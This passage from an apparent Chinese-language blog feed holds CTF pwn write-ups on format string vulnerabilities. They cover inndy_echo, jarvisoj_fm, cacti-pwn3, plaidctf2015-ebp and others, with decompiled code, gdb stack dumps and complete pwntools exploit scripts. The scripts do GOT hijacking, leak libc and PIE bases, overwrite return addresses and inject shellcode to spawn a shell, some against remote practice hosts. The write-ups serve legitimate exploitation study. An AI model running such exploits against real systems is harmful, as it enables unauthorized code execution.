range(1):    payload +=fmtbyte(prev,(key4 &gt;&gt; 8*i) &amp; 0xff,85+i)     prev = (key4 &gt;&gt; i*8) &amp; 0xffpayload = payload + &#39;2222&#39;io.sendline(payload)io.recvuntil(&#39;2222&#39;)info(&#39;--------change printf_got to system_addr:-------&#39;)raw_input(&#39;-&gt;&#39;)prev = 0 payload = &quot;&quot;key5 = int(hex(system_addr)[-4:],16)key6 = int(hex(system_addr)[2:6],16)print(&#39;key5 -&gt; &#39; + hex(key5))print(&#39;key6 -&gt; &#39; + hex(key6))for i in range(1):    payload +=fmtshort(prev,(key5 &gt;&gt; 16*i) &amp; 0xffff,17+i)     prev = (key5 &gt;&gt; i*16) &amp; 0xfffffor i in range(1):    payload +=fmtshort(prev,(key6 &gt;&gt; 16*i) &amp; 0xffff,20+i)     prev = (key6 &gt;&gt; i*16) &amp; 0xffffpayload = payload + &#39;3333&#39;io.sendline(payload)sleep(1)io.recvuntil(&#39;3333&#39;)raw_input(&#39;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&#39;)io.sendline(&#39;/bin/sh\x00\x00\x00\x00\x00\x00&#39;)io.interactive()</code></pre><p>这个exp的难点在于：</p><ul><li>注意去定位到合适的栈结构再去利用</li><li>尽量充分利用每一次的printf</li><li>单次printf多次写入</li><li>注意每次传数据过去后，一定要接收一下，并且再一次的数据读入要防止bss上的缓冲区里面参杂数据的影响。</li></ul><h3 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h3><p>通过这两个例题说明，面对fmt的buf不在栈上时，归根结底也就是一定要学会<strong>灵活、充分的利用栈上的数据</strong>,单纯的ebp链只是适合简单的情况。</p><p>但是也是做题时，也是一定要优先考虑ebp链是否能利用，因为ebp链构成的话，它的相对偏移就是<strong>针对性程序本身的</strong>，基本不会受到libc版本的影响，用起来很好用，要优先考虑。</p><p>还有就是面对这种会<strong>有随机栈情况、没有ebp链</strong>的题目，一定要注意本地和远程的libc版本、注意环境,因为这些不一样导致栈的情况也是不一样的，导致exp也要有相应的变化。</p>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>学习记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>格式化字符串漏洞题目练习</title>
    <link href="/2020/03/15/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A0/"/>
    <url>/2020/03/15/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="格式化字符串漏洞题目练习"><a href="#格式化字符串漏洞题目练习" class="headerlink" title="格式化字符串漏洞题目练习"></a>格式化字符串漏洞题目练习</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>整合一下最近做的格式化字符串题目的练习，把wp给写一下，方便对总结对这个漏洞的利用套路和技巧。</p><h2 id="inndy-echo"><a href="#inndy-echo" class="headerlink" title="inndy_echo"></a>inndy_echo</h2><h3 id="保护和arch"><a href="#保护和arch" class="headerlink" title="保护和arch"></a>保护和arch</h3><pre><code>[*] &#39;/media/psf/mypwn2/buuctf/inndy_echo/echo&#39;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code class="c">int __cdecl __noreturn main(int argc, const char **argv, const char **envp){  char s; // [esp+Ch] [ebp-10Ch]  unsigned int v4; // [esp+10Ch] [ebp-Ch]  v4 = __readgsdword(0x14u);  setvbuf(stdin, 0, 2, 0);  setvbuf(stdout, 0, 2, 0);  do  {    fgets(&amp;s, 256, stdin);    printf(&amp;s);  }  while ( strcmp(&amp;s, &quot;exit\n&quot;) );  system(&quot;echo Goodbye&quot;);  exit(0);}</code></pre><p>可以看到会无限的打印你输入的东西，并且有system这个函数，利用思路也就是GOT hijack，把printf函数的got改为system的plt，注意要单次printf多次写入，改为system的plt后，再传过去<code>/bin/sh</code>，此时就会变成<code>system(/bin/sh)</code></p><h3 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h3><pre><code>gdb-peda$ stack 0x200000| 0xffffd250 --&gt; 0xffffd26c (&quot;AAAA\n&quot;)0004| 0xffffd254 --&gt; 0x1000008| 0xffffd258 --&gt; 0xf7fb25a0 --&gt; 0xfbad208b0012| 0xffffd25c --&gt; 0x00016| 0xffffd260 --&gt; 0xf7ffd000 --&gt; 0x23f400020| 0xffffd264 --&gt; 0x80482e7 (&quot;__libc_start_main&quot;)0024| 0xffffd268 --&gt; 0xf63d4e2e0028| 0xffffd26c (&quot;AAAA\n&quot;)</code></pre><pre><code class="c">gdb-peda$ fmtarg 0xffffd26cThe index of format argument : 7 (&quot;\%6$p&quot;)</code></pre><p>确定偏移是7，打算一会写payload时候需要补齐，就<code>.ljust</code>补成0x20的，也就是<code>offset = 7 + 0x20/4 = 15</code></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;# io = process(&#39;./echo&#39;)io = remote(&#39;node3.buuoj.cn&#39;,26990)system_plt = 0x08048400printf_got = 0x0804A010def fmt_short(prev,val,idx,byte = 2):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;    return resultprev = 0 payload = &quot;&quot;key = 0x08048400for i in range(2):    payload +=fmt_short(prev,(key &gt;&gt; 16*i) &amp; 0xffff,15+i)     prev = (key &gt;&gt; i*16) &amp; 0xffffpayload = payload.ljust(0x20,&#39;a&#39;) + p32(printf_got) + p32(printf_got+2)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.send(&#39;/bin/sh\x00&#39;)io.interactive()</code></pre><p>换一种就是用pwntools模块，面对32位，这种情况还是很好用的：</p><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;# io = process(&#39;./echo&#39;)io = remote(&#39;node3.buuoj.cn&#39;,26990)system_plt = 0x08048400printf_got = 0x0804A010payload = fmtstr_payload(7,{printf_got : system_plt})io.sendline(payload)io.send(&#39;/bin/sh\x00&#39;)io.interactive()</code></pre><pre><code class="c">[DEBUG] Sent 0x3c bytes:    00000000  10 a0 04 08  11 a0 04 08  12 a0 04 08  13 a0 04 08  │····│····│····│····│    00000010  25 32 34 30  63 25 37 24  68 68 6e 25  31 33 32 63  │%240│c%7$│hhn%│132c│    00000020  25 38 24 68  68 6e 25 31  32 38 63 25  39 24 68 68  │%8$h│hn%1│28c%│9$hh│    00000030  6e 25 34 63  25 31 30 24  68 68 6e 0a               │n%4c│%10$│hhn·││    0000003c</code></pre><p>可以看一下其生成的payload，把目标地址信息放在开头，在64位是肯定是不可行的。</p><h2 id="jarvisoj-fm"><a href="#jarvisoj-fm" class="headerlink" title="jarvisoj_fm"></a>jarvisoj_fm</h2><h3 id="ida分析-1"><a href="#ida分析-1" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code class="c">int __cdecl main(int argc, const char **argv, const char **envp){  char buf; // [esp+2Ch] [ebp-5Ch]  unsigned int v5; // [esp+7Ch] [ebp-Ch]  v5 = __readgsdword(0x14u);  be_nice_to_people();  memset(&amp;buf, 0, 0x50u);  read(0, &amp;buf, 0x50u);  printf(&amp;buf);  printf(&quot;%d!\n&quot;, *(_DWORD *)&amp;x);  if ( *(_DWORD *)&amp;x != 4 )    return 0;  puts(&quot;running sh...&quot;);  system(&quot;/bin/sh&quot;);  return 0;}</code></pre><p>十分简单的题目，检验 x 值是否为4，如果是4（数字），就直接给你shell了。</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;# io = process(&#39;./fm&#39;)io = remote(&#39;node3.buuoj.cn&#39;,26915)# io.recv()payload = p32(0x0804A02C) + &#39;%11$hn&#39;raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.interactive()</code></pre><h2 id="winesap-week6"><a href="#winesap-week6" class="headerlink" title="winesap_week6"></a>winesap_week6</h2><h3 id="源码："><a href="#源码：" class="headerlink" title="源码："></a>源码：</h3><pre><code class="c">#include &lt;stdio.h&gt;int main() {    setvbuf(stdout, 0, _IONBF, 0);    alarm(180);    char str[100];    while(gets(str)) {        printf(str);    }    return 0;}</code></pre><p>需要编译为64位，这个题比起来第一个也就是没有了system函数，需要自己泄漏一下libc的base，算出system地址，然后还是GOT hijack就可以了。</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre><code class="python">from pwn import *import timecontext.arch = &#39;amd64&#39;context.log_level = &#39;debug&#39;io = process(&#39;./fmt1&#39;)elf = ELF(&#39;./fmt1&#39;)libc = elf.libcprintf_got = 0x0000601020io.sendline(&#39;%21$p&#39;)io.recvuntil(&#39;0x&#39;)libc_base = int((io.recv(12)),16) - 240 -libc.symbols[&#39;__libc_start_main&#39;]system_addr = libc_base + libc.symbols[&#39;system&#39;]print(&#39;leak_libc_base: &#39; + hex(libc_base))print(&#39;system_addr: &#39; + hex(system_addr))def fmt_short(prev,val,idx,byte = 2):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;    return resultprev = 0 payload = &quot;&quot;key = system_addrfor i in range(3):    payload +=fmt_short(prev,(key &gt;&gt; 16*i) &amp; 0xffff,12+i)     prev = (key &gt;&gt; i*16) &amp; 0xffffpayload = payload.ljust(0x30,&#39;a&#39;) + p64(printf_got) +p64(printf_got+2) + p64(printf_got+4)io.sendline(payload)sleep(1)io.sendline(&#39;/bin/sh\x00&#39;)io.interactive()</code></pre><h2 id="HITCON-Training-lab8"><a href="#HITCON-Training-lab8" class="headerlink" title="HITCON-Training-lab8"></a>HITCON-Training-lab8</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><pre><code class="c">#include &lt;stdio.h&gt;int magic = 0 ;int main(){    char buf[0x100];    setvbuf(stdout,0,2,0);    puts(&quot;Please crax me !&quot;);    printf(&quot;Give me magic :&quot;);    read(0,buf,0x100);    printf(buf);    if(magic == 0xda){        system(&quot;cat /home/craxme/flag&quot;);    }else if(magic == 0xfaceb00c){        system(&quot;cat /home/craxme/craxflag&quot;);    }else{        puts(&quot;You need be a phd&quot;);    }}</code></pre><p>编译为64位。</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>（这个题目是纯粹就是为了练习任意地址写入的，我这里就直接写exp拿sheel了。）可以看到当再一次printf，之后程序便停止了，且结束前有puts函数。<br>思路就是可以GOT hijack put函数的GOT为read函数哪里，让其call puts函数时返回到read函数，并且在这次printf函数漏洞利用时，也把printf函数的GOT改为system的plt，然后传入<code>/bin/sh</code>即可。</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;io = process(&#39;./craxme&#39;)# io = remote(&#39;127.0.0.1&#39;,8888)magic = 0x0000060106Cio.recvuntil(&#39;:&#39;)system_plt = 0x04005A0puts_got = 0x0601018ret_addr = 0x00400747printf_got = 0x00601030key = 0x00400747key2 = 0x04005A0def fmt_short(prev,val,idx,byte = 2):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;    return resultprev = 0 payload = &quot;&quot;for i in range(3):    payload +=fmt_short(prev,(key &gt;&gt; 16*i) &amp; 0xffff,26+i)     prev = (key &gt;&gt; i*16) &amp; 0xfffffor i in range(3):    payload +=fmt_short(prev,(key2 &gt;&gt; 16*i) &amp; 0xffff,29+i)     prev = (key2 &gt;&gt; i*16) &amp; 0xffffpayload = payload.ljust(0x80+0x20,&#39;a&#39;) + flat([puts_got,puts_got+2,puts_got+4,printf_got,printf_got+2,printf_got+4])io.sendline(payload)io.interactive()</code></pre><h2 id="cacti-pwn3"><a href="#cacti-pwn3" class="headerlink" title="cacti-pwn3"></a>cacti-pwn3</h2><h3 id="保护和arch-1"><a href="#保护和arch-1" class="headerlink" title="保护和arch"></a>保护和arch</h3><pre><code class="python">[*] &#39;/media/psf/mypwn2/ctf_wiki/fmt/cctf/pwn3&#39;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><h3 id="ida分析-2"><a href="#ida分析-2" class="headerlink" title="ida分析"></a>ida分析</h3><p>这个题模拟了一个ftp服务。<br><img src="http://qiqianyun.chumen77.xyz/uPic/DH8PyF.png" srcset="/img/loading.gif" alt><br>这里控制的是登陆。进入分析一下：</p><pre><code class="c">char *__cdecl ask_username(char *dest){  char src[40]; // [esp+14h] [ebp-34h]  int i; // [esp+3Ch] [ebp-Ch]  puts(&quot;Connected to ftp.hacker.server&quot;);  puts(&quot;220 Serv-U FTP Server v6.4 for WinSock ready...&quot;);  printf(&quot;Name (ftp.hacker.server:Rainism):&quot;);  __isoc99_scanf(&quot;%40s&quot;, src);  for ( i = 0; i &lt;= 39 &amp;&amp; src[i]; ++i )    ++src[i];  return strcpy(dest, src);}</code></pre><p>用户名函数，发现对你输入的东西进行诸位的进行加一。</p><pre><code class="c">int __cdecl ask_password(char *s1){  if ( !strcmp(s1, &quot;sysbdmin&quot;) )    return puts(&quot;welcome!&quot;);  puts(&quot;who you are?&quot;);  exit(1);  return puts(&quot;welcome!&quot;);}</code></pre><p>用户密码函数，发现要跟<code>sysbdmin</code> 进行对比，如果不相等，就直接退出。<br>(strcmp函数对比两个字符串时，相等返回0，!0 = 非假 = 真）<br>所以这个绕过就时sysbdmin 诸位减1即可。<br><img src="http://qiqianyun.chumen77.xyz/uPic/tBKwyW.png" srcset="/img/loading.gif" alt><br>剩下的就是输入<code>get put dir</code>,会进入不同的分支，其中输入get函数：</p><pre><code class="c">int get_file(){  char dest; // [esp+1Ch] [ebp-FCh]  char s1; // [esp+E4h] [ebp-34h]  char *i; // [esp+10Ch] [ebp-Ch]  printf(&quot;enter the file name you want to get:&quot;);  __isoc99_scanf(&quot;%40s&quot;, &amp;s1);  if ( !strncmp(&amp;s1, &quot;flag&quot;, 4u) )    puts(&quot;too young, too simple&quot;);  for ( i = (char *)file_head; i; i = (char *)*((_DWORD *)i + 60) )  {    if ( !strcmp(i, &amp;s1) )    {      strcpy(&amp;dest, i + 40);      return printf(&amp;dest);    }  }  return printf(&amp;dest);}</code></pre><p>这个函数是有格式化字符串漏洞的，当你put上去一个文件，它会让你输入文件名字和文件内容，然后get这个函数会根据文件名字，来输出其内容，利用这两个函数搭配一下就可以实现格式化字符串漏洞的利用了。并且在dir中，其会输出一个文件的名字，用的是puts函数。然后就有思路利用了：</p><ul><li>由于没有system函数，然后就需要想办法泄漏一下libc地址，来算出system的函数在libc的地址。</li><li>修改puts函数的got为system的地址，然后记得这个文件的名称是<code>/bin/sh</code>,这样在使用dir调用puts函数时，就可以拿到shell了。<br>这题比较有趣，有点难在分析这个程序在干嘛，利用思路倒是不难。</li></ul><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;io = process(&#39;./pwn3&#39;)elf = ELF(&#39;./pwn3&#39;)libc = elf.libcs = &#39;sysbdmin&#39;key = &#39;&#39;for i in s:    key+=chr(ord(i)-1)print(key)io.sendline(key)info(&#39;---------leak libc_base--------&#39;)io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;put&#39;)io.recvuntil(&#39;upload:&#39;)io.sendline(&#39;1111&#39;)puts_got = elf.got[&#39;puts&#39;]io.sendline(&#39;%8$s&#39; + p32(puts_got) )io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;get&#39;)io.recvuntil(&#39;get:&#39;)io.sendline(&#39;1111&#39;)puts_addr = u32(io.recv(4)[:4])print(&#39;puts_add:&#39; + hex(puts_addr))sys_addr = puts_addr - libc.symbols[&#39;puts&#39;] + libc.symbols[&#39;system&#39;]io.recvuntil(&#39;&gt;&#39;)info(&#39;---------hijack puts_got--------&#39;)io.sendline(&#39;put&#39;)io.recvuntil(&#39;upload:&#39;)io.sendline(&#39;/bin/sh;&#39;)payload = fmtstr_payload(7,{puts_got: sys_addr})io.sendline(payload)io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;get&#39;)io.recvuntil(&#39;get:&#39;)info(&#39;--------- get shell-------&#39;)io.sendline(&#39;/bin/sh;&#39;)io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;dir&#39;)io.interactive()</code></pre><h2 id="三个白帽-pwnme-k0"><a href="#三个白帽-pwnme-k0" class="headerlink" title="三个白帽 - pwnme_k0"></a>三个白帽 - pwnme_k0</h2><h3 id="保护和arch-2"><a href="#保护和arch-2" class="headerlink" title="保护和arch"></a>保护和arch</h3><pre><code class="python">[*] &#39;/media/psf/mypwn2/ctf_wiki/fmt/sgbm_pwnme/pwnme_k0&#39;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><p>开启了RELRO，这样就无法修改got了。</p><h3 id="ida分析-3"><a href="#ida分析-3" class="headerlink" title="ida分析"></a>ida分析</h3><p>程序实现了一个注册用户的功能，注册好后可以来展示用户信息，修改用户信息，和退出。其中在展示用户信息当中，存在格式化字符串漏洞：</p><pre><code class="c">int __fastcall sub_400B07(char format, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, char formata, __int64 a8, __int64 a9){  write(0, &quot;Welc0me to sangebaimao!\n&quot;, 0x1AuLL);  printf(&amp;formata, &quot;Welc0me to sangebaimao!\n&quot;);  return printf(&amp;a9 + 4);}</code></pre><p>其中发现其输出的buf就是你输入的密码：<br><img src="http://qiqianyun.chumen77.xyz/uPic/o8t1UX.png" srcset="/img/loading.gif" alt><br>并且还发现其中有个后门函数，会调用system函数给你shell，就可以去修改程序的返回地址，直接返回到这里就拿到shell了。<br>Gdb调试定位关键在这个printf当中，确定一下：<br><img src="http://qiqianyun.chumen77.xyz/uPic/MsdWDQ.png" srcset="/img/loading.gif" alt></p><p>看一下此时的栈情况，输入的usename可以确定偏移是8，rdi也是指向了存放password的地址。并且发现栈上也有很多栈的地址信息，当第二次运行到这里的时候，这里esp对应的地址信息也是不会变的，所以就可以通过泄漏这里的值来算出ret address，然后修改用户信息，这下把ret address的point放到栈上，接着就开始修改ret address的值了。</p><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;io = process(&#39;./pwnme_k0&#39;)# context.clear(arch = &#39;amd64&#39;)io.recvuntil(&#39;lenth:20): \n&#39;)io.sendline(&#39;%0006$lx&#39;)io.recvuntil(&#39;lenth:20): \n&#39;)io.sendline(&#39;11111111&#39;)io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;1&#39;)# io.recvuntil(&#39;Welc0me to sangebaimao!\n&#39;)stack = int(io.recvline_contains(&#39;7f&#39;),16)print(stack)ret_add = stack - 0x38# system_add = 0x04008AApayload = &#39;%2218c%8$hn&#39;io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;2&#39;)io.recvuntil(&#39;lenth:20): \n&#39;)io.sendline(p64(ret_add))io.recvuntil(&#39;lenth:20): \n&#39;)io.sendline(payload)io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;1&#39;)io.interactive()</code></pre><h2 id="inndy-echo2"><a href="#inndy-echo2" class="headerlink" title="inndy-echo2"></a>inndy-echo2</h2><h3 id="保护和arch-3"><a href="#保护和arch-3" class="headerlink" title="保护和arch"></a>保护和arch</h3><pre><code class="python">[*] &#39;/media/psf/mypwn2/buuctf/inndy_echo2/echo2&#39;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      PIE enabled</code></pre><p>可以看到开启了pie，这时候就需要来泄漏一下pie的基地址。</p><h3 id="ida分析-4"><a href="#ida分析-4" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code class="c">void __noreturn echo(){  char s; // [rsp+0h] [rbp-110h]  unsigned __int64 v1; // [rsp+108h] [rbp-8h]  v1 = __readfsqword(0x28u);  do  {    fgets(&amp;s, 256, stdin);    printf(&amp;s, 256LL);  }  while ( strcmp(&amp;s, &quot;exit\n&quot;) );  system(&quot;echo Goodbye&quot;);  exit(0);}</code></pre><p>代码是比较简单的，还是got hijack 就行了。难点也是如何来处理这个pie保护。</p><h3 id="gdb-调试"><a href="#gdb-调试" class="headerlink" title="gdb 调试"></a>gdb 调试</h3><pre><code class="c">=&gt; 0x555555554984 &lt;echo+68&gt;:    call   0x5555555547a0 &lt;printf@plt&gt;   0x555555554989 &lt;echo+73&gt;:    lea    rax,[rbp-0x110]   0x555555554990 &lt;echo+80&gt;:    lea    rsi,[rip+0xfd]        # 0x555555554a94   0x555555554997 &lt;echo+87&gt;:    mov    rdi,rax   0x55555555499a &lt;echo+90&gt;:    call   0x5555555547d0 &lt;strcmp@plt&gt;</code></pre><p>找到关键点，然后看一下栈情况：</p><pre><code class="c">0192| 0x7fffffffe1c0 --&gt; 0x7ffff7dd2620 --&gt; 0xfbad2087--More--(25/48)0200| 0x7fffffffe1c8 --&gt; 0x7ffff7a88947 (&lt;_IO_default_setbuf+23&gt;:    cmp    eax,0xffffffff)0208| 0x7fffffffe1d0 --&gt; 0x7ffff7dd2620 --&gt; 0xfbad20870216| 0x7fffffffe1d8 --&gt; 0x7ffff7fd8700 (0x00007ffff7fd8700)0224| 0x7fffffffe1e0 --&gt; 0x555555554810 (&lt;_start&gt;:    xor    ebp,ebp)0232| 0x7fffffffe1e8 --&gt; 0x7ffff7a85439 (&lt;_IO_new_file_setbuf+9&gt;:    test   rax,rax)0240| 0x7fffffffe1f0 --&gt; 0x7ffff7dd2620 --&gt; 0xfbad2087</code></pre><p>发现在<code>0x7fffffffe1e0</code>这里就可以泄漏出pie基址了，确定偏移是34。然后剩下的就简单了，直接ida里面查看下plt和got ，加上以后就得到了真正的<br>plt和got地址。</p><h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><pre><code class="c">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;io = process(&#39;./echo2&#39;)# io = remote(&#39;node3.buuoj.cn&#39;,28200)def leak1():    io.sendline(&#39;%34$p&#39;)    io.recvuntil(&#39;0x&#39;)    p_bass_addr = int((io.recv(9)+&#39;000&#39;),16)    return p_bass_addrp_bass_addr = leak1()print(&#39;p_bass_addr -&gt;&#39; + hex(p_bass_addr))print_got = 0x201020 + p_bass_addrprint(&#39;print_got -&gt;&#39; + hex(print_got))system_plt = 0x790 + p_bass_addrprint(&#39;system_plt -&gt;&#39; + hex(system_plt))def fmt(prev,val,idx,byte = 2):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;    return resultprev = 0 payload = &quot;&quot;key = system_pltfor i in range(3):    payload +=fmt(prev,(key &gt;&gt; 16*i) &amp; 0xffff,14+i)     prev = (key &gt;&gt; i*16) &amp; 0xffffpayload = payload.ljust(0x40,&#39;a&#39;) + flat([print_got,print_got+2,print_got+4])# raw_input(&#39;-&gt;&#39;)io.sendline(payload)sleep(0.1)io.sendline(&#39;/bin/sh\x00&#39;)io.interactive()</code></pre><p>-—  </p><p>** 接下来的题，都是buf不再栈的上的题目。**</p><h2 id="plaidctf2015-ebp"><a href="#plaidctf2015-ebp" class="headerlink" title="plaidctf2015-ebp"></a>plaidctf2015-ebp</h2><h3 id="保护和arch-4"><a href="#保护和arch-4" class="headerlink" title="保护和arch"></a>保护和arch</h3><pre><code class="c">[*] &#39;/media/psf/mypwn2/buuctf/plaidctf2015_ebp/ebp&#39;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      No PIE (0x8048000)    RWX:      Has RWX segments</code></pre><p>可以看到nx保护是关闭的，可以想办法利用shellcode。</p><h3 id="ida分析-5"><a href="#ida分析-5" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code class="c">int __cdecl main(int argc, const char **argv, const char **envp){  int result; // eax  while ( 1 )  {    result = (int)fgets(buf, 1024, stdin);    if ( !result )      break;    echo();  }  return result;}</code></pre><p>漏洞函数：</p><pre><code class="c">int make_response(){  return snprintf(response, 0x400u, buf);}</code></pre><p>代码十分简单，但是这次的漏洞函数变成了snprintf ，时刻注意偏移的计算是针对格式化字符串的偏移。且buf是在bss段上的，已经变得不是我们当初一样十分的好控制，此时就需要想办法好好利用栈上原来有的数据。</p><h3 id="gdb调试-1"><a href="#gdb调试-1" class="headerlink" title="gdb调试"></a>gdb调试</h3><pre><code class="html">gdb-peda$ stack 0x200000| 0xffffd320 --&gt; 0x804a480 --&gt; 0x00004| 0xffffd324 --&gt; 0x4000008| 0xffffd328 --&gt; 0x804a080 (&quot;AAAA\n&quot;)0012| 0xffffd32c --&gt; 0xf7fd31b0 --&gt; 0xf7e00000 --&gt; 0x464c457f0016| 0xffffd330 --&gt; 0xf7fe77eb (&lt;_dl_fixup+11&gt;:    add    esi,0x15815)0020| 0xffffd334 --&gt; 0x00024| 0xffffd338 --&gt; 0xffffd358 --&gt; 0xffffd378 --&gt; 0x00028| 0xffffd33c --&gt; 0x804852c (&lt;echo+11&gt;:    mov    DWORD PTR [esp],0x804a480)</code></pre><p>可以看一下此时的栈情况。可以看到上面有很多可以利用的地址信息，其中最常用的也是ebp链 ：</p><pre><code class="html">0024| 0xffffd338 --&gt; 0xffffd358 --&gt; 0xffffd378 --&gt; 0x0</code></pre><p><strong>也就是这一个，第一次可以通过利用0xffffd338（ebp1）这个地址，其指向0xffffd358 （ebp2），然后利用<code>%xc%4$hhn</code> 就可以修改0xffffd378（ebp3）。</strong><br><strong>将0xffffd378 改为指向ret address的栈地址  <code>0xffffd33c</code>  ：</strong></p><pre><code class="html">0024| 0xffffd338 --&gt; 0xffffd358 --&gt; 0xffffd33c --&gt; 0x804852c (&lt;echo+11&gt;:    mov    DWORD PTR [esp],0x804a480)0028| 0xffffd33c --&gt; 0x804852c (&lt;echo+11&gt;:    mov    DWORD PTR [esp],0x804a480)</code></pre><p>改完也就是这样的效果。<br><strong>这样就又可以通过利用 0xffffd358 （ebp2），其指向 0xffffd33c（ebp3），</strong><br><strong>接着就算一下0xffffd358 （ebp2）的偏移 y，然后利用<code>%xc%y$hhn</code> 就可以修改0x804852c（ret address）</strong></p><p>这样攻击思路也就出来了，可以修改retaddress ，返回在可控的buf 上面放好shellcode ，控制程序跳到shellcode即可。</p><h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timecontext.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;io = process(&#39;./ebp&#39;)# io = remote(&#39;node3.buuoj.cn&#39;,29994)buf = 0x0804a080 + 0x40 #0x804a0c0raw_input(&#39;-&gt;&#39;)io.sendline(&#39;%4$p&#39;)ret_stack_addr = int(io.recv(10),16) - 28print(&#39;leak ret_stack_addr:&#39;+hex(ret_stack_addr))key1 = int(str(hex(ret_stack_addr))[-2:],16)key2 = 0xa0c0payload = &#39;%{}c%4$hhn&#39;.format(key1)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recv()payload = &#39;%{}c%12$hn&#39;.format(key2)payload = payload.ljust(0x40) payload +=  asm(shellcraft.sh())io.sendline(payload)io.interactive()</code></pre><h2 id="hitcontraining-playfmt"><a href="#hitcontraining-playfmt" class="headerlink" title="hitcontraining-playfmt"></a>hitcontraining-playfmt</h2><h3 id="保护和arch-5"><a href="#保护和arch-5" class="headerlink" title="保护和arch"></a>保护和arch</h3><pre><code>[*] &#39;/media/psf/mypwn2/buuctf/hitcontraining_playfmt/playfmt&#39;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      No PIE (0x8048000)    RWX:      Has RWX segments</code></pre><p>没有任何保护。</p><h3 id="ida分析-6"><a href="#ida分析-6" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code class="c">int do_fmt(){  int result; // eax  while ( 1 )  {    read(0, buf, 0xC8u);    result = strncmp(buf, &quot;quit&quot;, 4u);    if ( !result )      break;    printf(buf);  }  return result;}</code></pre><p>上层有play 和 main函数，一共三层，在第三层的这个函数存在格式化字符串漏洞，让我们很方便的用ebp链来做题。然后，有无限次的触发这个漏洞的机会。</p><p>攻击思路 ：因为没有开nx保护，也就以为着可以用shellcode进行攻击。然后还是改返回地址，提前在可控的buf合适的地方摆上shellcode，然后跳上去即可。</p><h3 id="gdb分析"><a 